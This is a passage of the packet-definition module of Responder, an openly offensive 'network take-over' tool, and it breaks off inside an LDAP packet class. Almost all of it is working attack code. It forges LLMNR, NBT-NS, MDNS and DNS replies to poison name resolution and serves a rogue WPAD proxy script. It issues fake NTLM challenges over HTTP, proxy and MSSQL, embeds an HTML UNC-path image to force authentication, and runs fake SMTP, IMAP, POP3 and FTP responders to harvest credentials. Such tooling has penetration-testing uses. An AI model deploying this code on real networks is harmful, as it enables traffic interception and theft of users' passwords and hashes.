#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
import datetime
#import settings
import binascii

from base64 import b64decode, b64encode
#from .odict import OrderedDict
from collections import OrderedDict
#from .utils import HTTPCurrentDate, RespondWithIPAton

def HTTPCurrentDate():
    Date = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
    return Date

def RespondWithIPAton():
    return '0.0.0.0'

# Packet class handling all packet generation (see odict.py).
class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
                
    def __str__(self):
        return "".join(map(str, self.fields.values()))
    
    def __bytes__(self):
        return b"".join(map(bytes, self.fields.values()))
       
    def get_bytes(self):
        p = b''
        for v in "".join(map(str, self.fields.values())):
            p = p + struct.pack("B", ord(v))
        return p

# NBT Answer Packet
class NBT_Ans(Packet):
    fields = OrderedDict([
        ("Tid",           ""),
        ("Flags",         "\x85\x00"),
        ("Question",      "\x00\x00"),
        ("AnswerRRS",     "\x00\x01"),
        ("AuthorityRRS",  "\x00\x00"),
        ("AdditionalRRS", "\x00\x00"),
        ("NbtName",       ""),
        ("Type",          "\x00\x20"),
        ("Classy",        "\x00\x01"),
        ("TTL",           "\x00\x00\x00\xa5"),
        ("Len",           "\x00\x06"),
        ("Flags1",        "\x00\x00"),
        ("IP",            "\x00\x00\x00\x00"),
    ])

    def calculate(self,data):
        self.fields["Tid"] = data[0:2]
        self.fields["NbtName"] = data[12:46]
        self.fields["IP"] = RespondWithIPAton()

# DNS Answer Packet
class DNS_Ans(Packet):
    fields = OrderedDict([
        ("Tid",              ""),
        ("Flags",            "\x80\x10"),
        ("Question",         "\x00\x01"),
        ("AnswerRRS",        "\x00\x01"),
        ("AuthorityRRS",     "\x00\x00"),
        ("AdditionalRRS",    "\x00\x00"),
        ("QuestionName",     ""),
        ("QuestionNameNull", "\x00"),
        ("Type",             "\x00\x01"),
        ("Class",            "\x00\x01"),
        ("AnswerPointer",    "\xc0\x0c"),
        ("Type1",            "\x00\x01"),
        ("Class1",           "\x00\x01"),
        ("TTL",              "\x00\x00\x00\x1e"), #30 secs, don't mess with their cache for too long..
        ("IPLen",            "\x00\x04"),
        ("IP",               "\x00\x00\x00\x00"),
    ])

    def calculate(self,data):
        self.fields["Tid"] = data[0:2]
        self.fields["QuestionName"] = ''.join(data[12:].split('\x00')[:1])
        self.fields["IP"] = RespondWithIPAton()
        self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))

# LLMNR Answer Packet
class LLMNR_Ans(Packet):
    fields = OrderedDict([
        ("Tid",              ""),
        ("Flags",            "\x80\x00"),
        ("Question",         "\x00\x01"),
        ("AnswerRRS",        "\x00\x01"),
        ("AuthorityRRS",     "\x00\x00"),
        ("AdditionalRRS",    "\x00\x00"),
        ("QuestionNameLen",  "\x09"),
        ("QuestionName",     ""),
        ("QuestionNameNull", "\x00"),
        ("Type",             "\x00\x01"),
        ("Class",            "\x00\x01"),
        ("AnswerNameLen",    "\x09"),
        ("AnswerName",       ""),
        ("AnswerNameNull",   "\x00"),
        ("Type1",            "\x00\x01"),
        ("Class1",           "\x00\x01"),
        ("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec.
        ("IPLen",            "\x00\x04"),
        ("IP",               "\x00\x00\x00\x00"),
    ])

    def calculate(self):
        self.fields["IP"] = RespondWithIPAton()
        self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))
        self.fields["AnswerNameLen"] = struct.pack(">h",len(self.fields["AnswerName"]))[1]
        self.fields["QuestionNameLen"] = struct.pack(">h",len(self.fields["QuestionName"]))[1]

# MDNS Answer Packet
class MDNS_Ans(Packet):
    fields = OrderedDict([
        ("Tid",              "\x00\x00"),
        ("Flags",            "\x84\x00"),
        ("Question",         "\x00\x00"),
        ("AnswerRRS",        "\x00\x01"),
        ("AuthorityRRS",     "\x00\x00"),
        ("AdditionalRRS",    "\x00\x00"),
        ("AnswerName",       ""),
        ("AnswerNameNull",   "\x00"),
        ("Type",             "\x00\x01"),
        ("Class",            "\x00\x01"),
        ("TTL",              "\x00\x00\x00\x78"),##Poison for 2mn.
        ("IPLen",            "\x00\x04"),
        ("IP",               "\x00\x00\x00\x00"),
    ])

    def calculate(self):
        self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))

##### HTTP Packets #####
class NTLM_Challenge(Packet):
    fields = OrderedDict([
        ("Signature",        "NTLMSSP"),
        ("SignatureNull",    "\x00"),
        ("MessageType",      "\x02\x00\x00\x00"),
        ("TargetNameLen",    "\x06\x00"),
        ("TargetNameMaxLen", "\x06\x00"),
        ("TargetNameOffset", "\x38\x00\x00\x00"),
        ("NegoFlags",        "\x05\x02\x89\xa2"),
        ("ServerChallenge",  ""),
        ("Reserved",         "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("TargetInfoLen",    "\x7e\x00"),
        ("TargetInfoMaxLen", "\x7e\x00"),
        ("TargetInfoOffset", "\x3e\x00\x00\x00"),
        ("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
        ("TargetNameStr",    "SMB"),
        ("Av1",              "\x02\x00"),#nbt name
        ("Av1Len",           "\x06\x00"),
        ("Av1Str",           "SMB"),
        ("Av2",              "\x01\x00"),#Server name
        ("Av2Len",           "\x14\x00"),
        ("Av2Str",           "SMB-TOOLKIT"),
        ("Av3",              "\x04\x00"),#Full Domain name
        ("Av3Len",           "\x12\x00"),
        ("Av3Str",           "smb.local"),
        ("Av4",              "\x03\x00"),#Full machine domain name
        ("Av4Len",           "\x28\x00"),
        ("Av4Str",           "server2003.smb.local"),
        ("Av5",              "\x05\x00"),#Domain Forest Name
        ("Av5Len",           "\x12\x00"),
        ("Av5Str",           "smb.local"),
        ("Av6",              "\x00\x00"),#AvPairs Terminator
        ("Av6Len",           "\x00\x00"),
    ])

    def calculate(self):
        # First convert to unicode
        self.fields["TargetNameStr"] = self.fields["TargetNameStr"].encode('utf-16le')
        self.fields["Av1Str"] = self.fields["Av1Str"].encode('utf-16le')
        self.fields["Av2Str"] = self.fields["Av2Str"].encode('utf-16le')
        self.fields["Av3Str"] = self.fields["Av3Str"].encode('utf-16le')
        self.fields["Av4Str"] = self.fields["Av4Str"].encode('utf-16le')
        self.fields["Av5Str"] = self.fields["Av5Str"].encode('utf-16le')

        # Then calculate
        CalculateNameOffset = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])
        CalculateAvPairsOffset = CalculateNameOffset+str(self.fields["TargetNameStr"])
        CalculateAvPairsLen = str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        # Target Name Offsets
        self.fields["TargetNameOffset"] = struct.pack("<i", len(CalculateNameOffset))
        self.fields["TargetNameLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        self.fields["TargetNameMaxLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        # AvPairs Offsets
        self.fields["TargetInfoOffset"] = struct.pack("<i", len(CalculateAvPairsOffset))
        self.fields["TargetInfoLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        self.fields["TargetInfoMaxLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        # AvPairs StrLen
        self.fields["Av1Len"] = struct.pack("<i", len(str(self.fields["Av1Str"])))[:2]
        self.fields["Av2Len"] = struct.pack("<i", len(str(self.fields["Av2Str"])))[:2]
        self.fields["Av3Len"] = struct.pack("<i", len(str(self.fields["Av3Str"])))[:2]
        self.fields["Av4Len"] = struct.pack("<i", len(str(self.fields["Av4Str"])))[:2]
        self.fields["Av5Len"] = struct.pack("<i", len(str(self.fields["Av5Str"])))[:2]

class IIS_Auth_401_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
        ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("CRLF",          "\r\n"),
    ])

class IIS_Auth_Granted(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
        ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"),
        ("CRLF",          "\r\n\r\n"),
        ("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class IIS_NTLM_Challenge_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
        ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWWAuth",       "WWW-Authenticate: NTLM "),
        ("Payload",       ""),
        ("Payload-CRLF",  "\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("CRLF",          "\r\n"),
    ])

    def calculate(self,payload):
        self.fields["Payload"] = b64encode(payload)

class IIS_Basic_401_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
        ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: Basic realm=\"Authentication Required\"\r\n"),
        ("AllowOrigin",   "Access-Control-Allow-Origin: *\r\n"),
        ("AllowCreds",    "Access-Control-Allow-Credentials: true\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("CRLF",          "\r\n"),
    ])

##### Proxy mode Packets #####
class WPADScript(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ServerTlype",    "Server: Microsoft-IIS/7.5\r\n"),
        ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
        ("Type",          "Content-Type: application/x-ns-proxy-autoconfig\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"),
        ("CRLF",          "\r\n\r\n"),
        ("Payload",       "function FindProxyForURL(url, host){return 'PROXY wpadwpadwpad:3141; DIRECT';}"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class ServeExeFile(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ContentType",   "Content-Type: application/octet-stream\r\n"),
        ("LastModified",  "Last-Modified: "+HTTPCurrentDate()+"\r\n"),
        ("AcceptRanges",  "Accept-Ranges: bytes\r\n"),
        ("Server",        "Server: Microsoft-IIS/7.5\r\n"),
        ("ContentDisp",   "Content-Disposition: attachment; filename="),
        ("ContentDiFile", ""),
        ("FileCRLF",      ";\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"),
        ("Date",          "\r\nDate: "+HTTPCurrentDate()+"\r\n"),
        ("Connection",    "Connection: keep-alive\r\n"),
        ("X-CCC",         "US\r\n"),
        ("X-CID",         "2\r\n"),
        ("CRLF",          "\r\n"),
        ("Payload",       "jj"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class ServeHtmlFile(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ContentType",   "Content-Type: text/html\r\n"),
        ("LastModified",  "Last-Modified: "+HTTPCurrentDate()+"\r\n"),
        ("AcceptRanges",  "Accept-Ranges: bytes\r\n"),
        ("Server",        "Server: Microsoft-IIS/7.5\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"),
        ("Date",          "\r\nDate: "+HTTPCurrentDate()+"\r\n"),
        ("Connection",    "Connection: keep-alive\r\n"),
        ("CRLF",          "\r\n"),
        ("Payload",       "jj"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

##### WPAD Auth Packets #####
class WPAD_Auth_407_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
        ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "Proxy-Authenticate: NTLM\r\n"),
        ("Connection",    "Proxy-Connection: close\r\n"),
        ("Cache-Control",    "Cache-Control: no-cache\r\n"),
        ("Pragma",        "Pragma: no-cache\r\n"),
        ("Proxy-Support", "Proxy-Support: Session-Based-Authentication\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("CRLF",          "\r\n"),
    ])


class WPAD_NTLM_Challenge_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
        ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWWAuth",       "Proxy-Authenticate: NTLM "),
        ("Payload",       ""),
        ("Payload-CRLF",  "\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("CRLF",          "\r\n"),
    ])

    def calculate(self,payload):
        self.fields["Payload"] = b64encode(payload)

class WPAD_Basic_407_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
        ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "Proxy-Authenticate: Basic realm=\"Authentication Required\"\r\n"),
        ("Connection",    "Proxy-Connection: close\r\n"),
        ("Cache-Control",    "Cache-Control: no-cache\r\n"),
        ("Pragma",        "Pragma: no-cache\r\n"),
        ("Proxy-Support", "Proxy-Support: Session-Based-Authentication\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("CRLF",          "\r\n"),
    ])

##### WEB Dav Stuff #####
class WEBDAV_Options_Answer(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
        ("Allow",         "Allow: GET,HEAD,POST,OPTIONS,TRACE\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("Keep-Alive:", "Keep-Alive: timeout=5, max=100\r\n"),
        ("Connection",    "Connection: Keep-Alive\r\n"),
        ("Content-Type",  "Content-Type: text/html\r\n"),
        ("CRLF",          "\r\n"),
    ])

##### FTP Packets #####
class FTPPacket(Packet):
    fields = OrderedDict([
        ("Code",           "220"),
        ("Separator",      "\x20"),
        ("Message",        "Welcome"),
        ("Terminator",     "\x0d\x0a"),
    ])

##### SQL Packets #####
class MSSQLPreLoginAnswer(Packet):
    fields = OrderedDict([
        ("PacketType",       "\x04"),
        ("Status",           "\x01"),
        ("Len",              "\x00\x25"),
        ("SPID",             "\x00\x00"),
        ("PacketID",         "\x01"),
        ("Window",           "\x00"),
        ("TokenType",        "\x00"),
        ("VersionOffset",    "\x00\x15"),
        ("VersionLen",       "\x00\x06"),
        ("TokenType1",       "\x01"),
        ("EncryptionOffset", "\x00\x1b"),
        ("EncryptionLen",    "\x00\x01"),
        ("TokenType2",       "\x02"),
        ("InstOptOffset",    "\x00\x1c"),
        ("InstOptLen",       "\x00\x01"),
        ("TokenTypeThrdID",  "\x03"),
        ("ThrdIDOffset",     "\x00\x1d"),
        ("ThrdIDLen",        "\x00\x00"),
        ("ThrdIDTerminator", "\xff"),
        ("VersionStr",       "\x09\x00\x0f\xc3"),
        ("SubBuild",         "\x00\x00"),
        ("EncryptionStr",    "\x02"),
        ("InstOptStr",       "\x00"),
    ])

    def calculate(self):
        CalculateCompletePacket = str(self.fields["PacketType"])+str(self.fields["Status"])+str(self.fields["Len"])+str(self.fields["SPID"])+str(self.fields["PacketID"])+str(self.fields["Window"])+str(self.fields["TokenType"])+str(self.fields["VersionOffset"])+str(self.fields["VersionLen"])+str(self.fields["TokenType1"])+str(self.fields["EncryptionOffset"])+str(self.fields["EncryptionLen"])+str(self.fields["TokenType2"])+str(self.fields["InstOptOffset"])+str(self.fields["InstOptLen"])+str(self.fields["TokenTypeThrdID"])+str(self.fields["ThrdIDOffset"])+str(self.fields["ThrdIDLen"])+str(self.fields["ThrdIDTerminator"])+str(self.fields["VersionStr"])+str(self.fields["SubBuild"])+str(self.fields["EncryptionStr"])+str(self.fields["InstOptStr"])
        VersionOffset = str(self.fields["TokenType"])+str(self.fields["VersionOffset"])+str(self.fields["VersionLen"])+str(self.fields["TokenType1"])+str(self.fields["EncryptionOffset"])+str(self.fields["EncryptionLen"])+str(self.fields["TokenType2"])+str(self.fields["InstOptOffset"])+str(self.fields["InstOptLen"])+str(self.fields["TokenTypeThrdID"])+str(self.fields["ThrdIDOffset"])+str(self.fields["ThrdIDLen"])+str(self.fields["ThrdIDTerminator"])
        EncryptionOffset = VersionOffset+str(self.fields["VersionStr"])+str(self.fields["SubBuild"])
        InstOpOffset = EncryptionOffset+str(self.fields["EncryptionStr"])
        ThrdIDOffset = InstOpOffset+str(self.fields["InstOptStr"])

        self.fields["Len"] = struct.pack(">h",len(CalculateCompletePacket))
        #Version
        self.fields["VersionLen"] = struct.pack(">h",len(self.fields["VersionStr"]+self.fields["SubBuild"]))
        self.fields["VersionOffset"] = struct.pack(">h",len(VersionOffset))
        #Encryption
        self.fields["EncryptionLen"] = struct.pack(">h",len(self.fields["EncryptionStr"]))
        self.fields["EncryptionOffset"] = struct.pack(">h",len(EncryptionOffset))
        #InstOpt
        self.fields["InstOptLen"] = struct.pack(">h",len(self.fields["InstOptStr"]))
        self.fields["EncryptionOffset"] = struct.pack(">h",len(InstOpOffset))
        #ThrdIDOffset
        self.fields["ThrdIDOffset"] = struct.pack(">h",len(ThrdIDOffset))

class MSSQLNTLMChallengeAnswer(Packet):
    fields = OrderedDict([
        ("PacketType",       "\x04"),
        ("Status",           "\x01"),
        ("Len",              "\x00\xc7"),
        ("SPID",             "\x00\x00"),
        ("PacketID",         "\x01"),
        ("Window",           "\x00"),
        ("TokenType",        "\xed"),
        ("SSPIBuffLen",      "\xbc\x00"),
        ("Signature",        "NTLMSSP"),
        ("SignatureNull",    "\x00"),
        ("MessageType",      "\x02\x00\x00\x00"),
        ("TargetNameLen",    "\x06\x00"),
        ("TargetNameMaxLen", "\x06\x00"),
        ("TargetNameOffset", "\x38\x00\x00\x00"),
        ("NegoFlags",        "\x05\x02\x89\xa2"),
        ("ServerChallenge",  ""),
        ("Reserved",         "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("TargetInfoLen",    "\x7e\x00"),
        ("TargetInfoMaxLen", "\x7e\x00"),
        ("TargetInfoOffset", "\x3e\x00\x00\x00"),
        ("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
        ("TargetNameStr",    "SMB"),
        ("Av1",              "\x02\x00"),#nbt name
        ("Av1Len",           "\x06\x00"),
        ("Av1Str",           "SMB"),
        ("Av2",              "\x01\x00"),#Server name
        ("Av2Len",           "\x14\x00"),
        ("Av2Str",           "SMB-TOOLKIT"),
        ("Av3",              "\x04\x00"),#Full Domain name
        ("Av3Len",           "\x12\x00"),
        ("Av3Str",           "smb.local"),
        ("Av4",              "\x03\x00"),#Full machine domain name
        ("Av4Len",           "\x28\x00"),
        ("Av4Str",           "server2003.smb.local"),
        ("Av5",              "\x05\x00"),#Domain Forest Name
        ("Av5Len",           "\x12\x00"),
        ("Av5Str",           "smb.local"),
        ("Av6",              "\x00\x00"),#AvPairs Terminator
        ("Av6Len",           "\x00\x00"),
    ])

    def calculate(self):
        # First convert to unicode
        self.fields["TargetNameStr"] = self.fields["TargetNameStr"].encode('utf-16le')
        self.fields["Av1Str"] = self.fields["Av1Str"].encode('utf-16le')
        self.fields["Av2Str"] = self.fields["Av2Str"].encode('utf-16le')
        self.fields["Av3Str"] = self.fields["Av3Str"].encode('utf-16le')
        self.fields["Av4Str"] = self.fields["Av4Str"].encode('utf-16le')
        self.fields["Av5Str"] = self.fields["Av5Str"].encode('utf-16le')

        # Then calculate
        CalculateCompletePacket = str(self.fields["PacketType"])+str(self.fields["Status"])+str(self.fields["Len"])+str(self.fields["SPID"])+str(self.fields["PacketID"])+str(self.fields["Window"])+str(self.fields["TokenType"])+str(self.fields["SSPIBuffLen"])+str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])+str(self.fields["TargetNameStr"])+str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])
        CalculateSSPI = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])+str(self.fields["TargetNameStr"])+str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])
        CalculateNameOffset = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])
        CalculateAvPairsOffset = CalculateNameOffset+str(self.fields["TargetNameStr"])
        CalculateAvPairsLen = str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        self.fields["Len"] = struct.pack(">h",len(CalculateCompletePacket))
        self.fields["SSPIBuffLen"] = struct.pack("<i",len(CalculateSSPI))[:2]
        # Target Name Offsets
        self.fields["TargetNameOffset"] = struct.pack("<i", len(CalculateNameOffset))
        self.fields["TargetNameLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        self.fields["TargetNameMaxLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        # AvPairs Offsets
        self.fields["TargetInfoOffset"] = struct.pack("<i", len(CalculateAvPairsOffset))
        self.fields["TargetInfoLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        self.fields["TargetInfoMaxLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        # AvPairs StrLen
        self.fields["Av1Len"] = struct.pack("<i", len(str(self.fields["Av1Str"])))[:2]
        self.fields["Av2Len"] = struct.pack("<i", len(str(self.fields["Av2Str"])))[:2]
        self.fields["Av3Len"] = struct.pack("<i", len(str(self.fields["Av3Str"])))[:2]
        self.fields["Av4Len"] = struct.pack("<i", len(str(self.fields["Av4Str"])))[:2]
        self.fields["Av5Len"] = struct.pack("<i", len(str(self.fields["Av5Str"])))[:2]

##### SMTP Packets #####
class SMTPGreeting(Packet):
    fields = OrderedDict([
        ("Code",       "220"),
        ("Separator",  "\x20"),
        ("Message",    "smtp01.local ESMTP"),
        ("CRLF",       "\x0d\x0a"),
    ])

class SMTPAUTH(Packet):
    fields = OrderedDict([
        ("Code0",      "250"),
        ("Separator0", "\x2d"),
        ("Message0",   "smtp01.local"),
        ("CRLF0",      "\x0d\x0a"),
        ("Code",       "250"),
        ("Separator",  "\x20"),
        ("Message",    "AUTH LOGIN PLAIN XYMCOOKIE"),
        ("CRLF",       "\x0d\x0a"),
    ])

class SMTPAUTH1(Packet):
    fields = OrderedDict([
        ("Code",       "334"),
        ("Separator",  "\x20"),
        ("Message",    "VXNlcm5hbWU6"),#Username
        ("CRLF",       "\x0d\x0a"),

    ])

class SMTPAUTH2(Packet):
    fields = OrderedDict([
        ("Code",       "334"),
        ("Separator",  "\x20"),
        ("Message",    "UGFzc3dvcmQ6"),#Password
        ("CRLF",       "\x0d\x0a"),
    ])

##### IMAP Packets #####
class IMAPGreeting(Packet):
    fields = OrderedDict([
        ("Code",     "* OK IMAP4 service is ready."),
        ("CRLF",     "\r\n"),
    ])

class IMAPCapability(Packet):
    fields = OrderedDict([
        ("Code",     "* CAPABILITY IMAP4 IMAP4rev1 AUTH=PLAIN"),
        ("CRLF",     "\r\n"),
    ])

class IMAPCapabilityEnd(Packet):
    fields = OrderedDict([
        ("Tag",     ""),
        ("Message", " OK CAPABILITY completed."),
        ("CRLF",    "\r\n"),
    ])

##### POP3 Packets #####
class POPOKPacket(Packet):
    fields = OrderedDict([
        ("Code",  "+OK"),
        ("CRLF",  "\r\n"),
    ])

##### LDAP Packets #####
class LDAPSearchDefaultPacket(Packet):
    fields = OrderedDict([
        ("ParserHeadASNID",          "\x30"),
        ("ParserHeadASNLen",         "\x0c"),
        ("MessageIDASNID",           "\x02"),
        ("MessageIDASNLen",          "\x01"),
        ("MessageIDASNStr",          "\x0f"),
        ("OpHeadASNID",              "\x65"),
        ("OpHeadASNIDLen",           "\x07"),
        ("SearchDoneSuccess",        "\x0A\x01\x00\x04\x00\x04\x00"),#No Results.
    ])

class LDAPSearchSupportedCapabilitiesPacket(Packet):
    fields = OrderedDict([
        ("ParserHeadASNID",          "\x30"),
        ("ParserHeadASNLenOfLen",    "\x84"),
        ("ParserHeadASNLen",         "\x00\x00\x00\x7e"),#126
        ("MessageIDASNID",           "\x02"),
        ("MessageIDASNLen",          "\x01"),
        ("MessageIDASNStr",          "\x02"),
        ("OpHeadASNID",              "\x64"),
        ("OpHeadASNIDLenOfLen",      "\x84"),
        ("OpHeadASNIDLen",           "\x00\x00\x00\x75"),#117
        ("ObjectName",               "\x04\x00"),
        ("SearchAttribASNID",        "\x30"),
        ("SearchAttribASNLenOfLen",  "\x84"),
        ("SearchAttribASNLen",       "\x00\x00\x00\x6d"),#109
        ("SearchAttribASNID1",       "\x30"),
        ("SearchAttribASN1LenOfLen", "\x84"),
        ("SearchAttribASN1Len",      "\x00\x00\x00\x67"),#103
        ("SearchAttribASN2ID",       "\x04"),
        ("SearchAttribASN2Len",      "\x15"),#21
        ("SearchAttribASN2Str",      "supportedCapabilities"),
        ("SearchAttribASN3ID",       "\x31"),
